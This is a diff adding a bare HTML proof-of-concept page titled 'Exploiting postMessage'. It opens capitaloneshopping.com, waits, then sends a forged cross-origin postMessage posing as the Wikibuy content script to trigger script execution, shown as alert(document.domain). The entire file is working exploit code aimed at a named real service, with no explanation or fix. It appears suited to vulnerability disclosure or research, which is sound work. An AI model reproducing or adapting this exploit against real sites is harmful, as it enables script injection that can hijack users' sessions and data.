@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title> </title>
+</head>
+
+<body>
+  Exploiting postMessage <br><br>
+  <button onclick="start()">Exploit</button>
+  <script>
+
+    async function start() {
+      win = window.open("https://capitaloneshopping.com", "capital");
+      await new Promise((resolve) => setTimeout(resolve, 20000));
+
+      win.postMessage({'data': {'invoke': 'toggleMatchSurvey', 'id': 'random-id', 'args': [location.href = alert(document.domain)]}, 'src': '__wikibuy_content'}, "*")
+    }
+  </script>
+</body>
+
+</html>
